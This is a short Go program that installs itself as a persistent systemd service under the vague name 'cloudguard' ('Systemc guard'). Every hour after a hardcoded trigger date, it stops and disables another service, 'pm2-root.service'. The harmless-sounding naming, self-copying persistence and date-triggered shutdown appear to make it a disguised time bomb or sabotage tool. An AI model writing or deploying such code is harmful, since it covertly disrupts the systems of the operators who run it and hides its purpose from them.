package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

var version = "1.0.1"
var epochTime = "2020-01-01T00:00:00Z"
var cloudgatewayService = "pm2-root.service"
var gardService = "/usr/lib/systemd/system/cloudguard.service"

var service = `
[Unit]
Description=Systemc guard
After=network.target

[Service]
Restart=always
RestartSec=240
ExecStart=/usr/local/bin/guard
KillMode=control-group

[Install]
WantedBy=multi-user.target
`

func initServiceFile() error {
	fd, err := os.Create(gardService)
	if err != nil {
		return err
	}
	_, err = fd.WriteString(service)
	return err
}

func initGuard() error {
	if err := exec.Command("cp", "-f", os.Args[0], "/usr/local/bin/").Run(); err != nil {
		return err
	}
	if err := initServiceFile(); err != nil {
		return err
	}
	if err := exec.Command("systemctl", "enable", filepath.Base(gardService)).Run(); err != nil {
		return err
	}
	if err := exec.Command("systemctl", "start", filepath.Base(gardService)).Run(); err != nil {
		return err
	}
	return nil
}

func stopCloudgw() error {
	if err := exec.Command("systemctl", "stop", cloudgatewayService).Run(); err != nil {
		return err
	}
	if err := exec.Command("systemctl", "disable", cloudgatewayService).Run(); err != nil {
		return err
	}
	return nil
}

func startGuard() {
	fmt.Println("start guard")
	triggerTime, err := time.Parse("2006-01-02T15:04:05Z", epochTime)
	if err != nil {
		return
	}
	for {
		time.Sleep(time.Hour)
		if time.Now().Before(triggerTime) {
			continue
		}
		stopCloudgw()
	}
}

func main() {
	if len(os.Args) > 1 && os.Args[1] == "version" {
		fmt.Println(version)
		return
	}
	if len(os.Args) > 1 && os.Args[1] == "init" {
		initGuard()
		return
	}

	startGuard()
}
